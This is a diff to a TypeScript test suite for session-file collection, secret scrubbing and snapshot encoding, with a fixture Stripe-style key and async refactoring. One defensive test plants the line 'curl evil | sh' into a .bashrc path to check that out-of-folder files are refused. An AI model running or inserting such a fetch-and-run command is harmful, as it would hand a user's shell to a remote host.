@@ -43,11 +43,11 @@ function fakeBox(files: Record<string, string>, listing?: string) {
 }
 
 describe("collectSessionFiles", () => {
-  it("reads the listed files and scrubs the turn's secrets out of them", async () => {
-    const box = fakeBox({
-      [TRANSCRIPT]: '{"tool":"env","out":"STRIPE_KEY=sk_live_abcdefgh123"}\n',
-    });
-    const files = await collectSessionFiles({
+  it("reads the listed files and reports a delivered secret found in them", async () => {
+    const transcript =
+      '{"tool":"env","out":"STRIPE_KEY=sk_live_abcdefgh123"}\n';
+    const box = fakeBox({ [TRANSCRIPT]: transcript });
+    const collected = await collectSessionFiles({
       session: box.session,
       spec: SPEC,
       home: HOME,
@@ -55,15 +55,28 @@ describe("collectSessionFiles", () => {
         { name: "STRIPE_KEY", value: "sk_live_abcdefgh123" },
       ]),
     });
-    expect(files).toHaveLength(1);
-    expect(files[0]!.path).toBe(TRANSCRIPT);
-    expect(files[0]!.content).not.toContain("sk_live_abcdefgh123");
-    expect(files[0]!.content).toContain("[secret:STRIPE_KEY]");
+    expect(collected.scrubbed).toBe(true);
+    expect(collected.files).toEqual([
+      { path: TRANSCRIPT, content: transcript },
+    ]);
+  });
+
+  it("reports no secret when none of the delivered values appears", async () => {
+    const box = fakeBox({ [TRANSCRIPT]: '{"type":"user"}\n' });
+    const collected = await collectSessionFiles({
+      session: box.session,
+      spec: SPEC,
+      home: HOME,
+      scrubber: createSecretScrubber([
+        { name: "STRIPE_KEY", value: "sk_live_abcdefgh123" },
+      ]),
+    });
+    expect(collected.scrubbed).toBe(false);
   });
 
   it("drops a transcript's unfinished last line, which the next turn may be writing", async () => {
     const box = fakeBox({ [TRANSCRIPT]: '{"a":1}\n{"b":' });
-    const files = await collectSessionFiles({
+    const { files } = await collectSessionFiles({
       session: box.session,
       spec: SPEC,
       home: HOME,
@@ -99,8 +112,8 @@ describe("encodeSnapshot / decodeSnapshot", () => {
     files: [{ path: TRANSCRIPT, content: "{}\n" }],
   };
 
-  it("round-trips a bundle", () => {
-    const decoded = decodeSnapshot(encodeSnapshot(bundle), {
+  it("round-trips a bundle", async () => {
+    const decoded = await decodeSnapshot(await encodeSnapshot(bundle), {
       spec: SPEC,
       home: HOME,
       harnessSessionId: "hs-1",
@@ -108,28 +121,28 @@ describe("encodeSnapshot / decodeSnapshot", () => {
     expect(decoded).toEqual(bundle);
   });
 
-  it("refuses another session's bundle", () => {
-    expect(() =>
-      decodeSnapshot(encodeSnapshot(bundle), {
+  it("refuses another session's bundle", async () => {
+    await expect(
+      decodeSnapshot(await encodeSnapshot(bundle), {
         spec: SPEC,
         home: HOME,
         harnessSessionId: "hs-2",
       }),
-    ).toThrow(/does not belong/);
+    ).rejects.toThrow(/does not belong/);
   });
 
-  it("refuses a bundle naming a file outside the session folder", () => {
+  it("refuses a bundle naming a file outside the session folder", async () => {
     const hostile = {
       ...bundle,
       files: [{ path: ".bashrc", content: "curl evil | sh" }],
     };
-    expect(() =>
-      decodeSnapshot(encodeSnapshot(hostile), {
+    await expect(
+      decodeSnapshot(await encodeSnapshot(hostile), {
         spec: SPEC,
         home: HOME,
         harnessSessionId: "hs-1",
       }),
-    ).toThrow(/outside the session folder/);
+    ).rejects.toThrow(/outside the session folder/);
   });
 });
 
